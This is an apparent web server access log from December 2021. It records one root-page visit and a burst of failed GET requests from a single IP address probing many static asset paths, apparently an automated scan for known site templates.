195.54.160.149 - - [23/Dec/2021:17:17:41 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.124.66.24 - - [23/Dec/2021:17:29:08 +0800] "GET /dist/static/tradeview/charting_library/charting_library.min.js HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
45.124.66.24 - - [23/Dec/2021:17:29:08 +0800] "GET /api/upload HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
45.124.66.24 - - [23/Dec/2021:17:29:08 +0800] "GET /static/index/js/lk/user.js HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
45.124.66.24 - - [23/Dec/2021:17:29:08 +0800] "GET /Public/mobile/js/config.js HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
45.124.66.24 - - [23/Dec/2021:17:29:08 +0800] "GET /Public/admin/hplus/css/login.min.css HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
45.124.66.24 - - [23/Dec/2021:17:29:08 +0800] "GET /Public/admin/hplus/css/bootstrap.min.css HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
45.124.66.24 - - [23/Dec/2021:17:29:08 +0800] "GET /static/home/js/rooms.js HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
45.124.66.24 - - [23/Dec/2021:17:29:08 +0800] "GET /Public/Qts/Home/css/pchome.css HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
45.124.66.24 - - [23/Dec/2021:17:29:08 +0800] "GET /static/index/js/lk/order.js HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
45.124.66.24 - - [23/Dec/2021:17:29:08 +0800] "GET /home/login/index.html HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
45.124.66.24 - - [23/Dec/2021:17:29:08 +0800] "GET /assets/js/platform/popper.min.js HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
45.124.66.24 - - [23/Dec/2021:17:29:08 +0800] "GET /resources/js/way.min.js HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
45.124.66.24 - - [23/Dec/2021:17:29:08 +0800] "GET /pcweb/static/css/main.e5ee9b2df05fc2d310734b11cc8c911e.css HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
45.124.66.24 - - [23/Dec/2021:17:29:08 +0800] "GET /m3/cssx/index-1.css HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
45.124.66.24 - - [23/Dec/2021:17:29:08 +0800] "GET /resources/main/index.js HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
45.124.66.24 - - [23/Dec/2021:17:29:08 +0800] "GET /static_new6/js/manifest.3ad1d5771e9b13dbdad2.js HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
45.124.66.24 - - [23/Dec/2021:17:29:08 +0800] "GET /static/lib/Hui-iconfont/1.0.8/iconfont.css HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
45.124.66.24 - - [23/Dec/2021:17:29:08 +0800] "GET /static/home/css/creative.css HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
45.124.66.24 - - [23/Dec/2021:17:29:08 +0800] "GET /static/home/css/financing.css HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
45.124.66.24 - - [23/Dec/2021:17:29:08 +0800] "GET /assets/version2/js/slide.js HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
45.124.66.24 - - [23/Dec/2021:17:29:08 +0800] "GET /tpl/Public/js/func.js HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
45.124.66.24 - - [23/Dec/2021:17:29:08 +0800] "GET /Public/Wap/jinrong/Mobile/Public/css/ucenter.css HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
45.124.66.24 - - [23/Dec/2021:17:29:08 +0800] "GET /resource/home/css/person.css HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
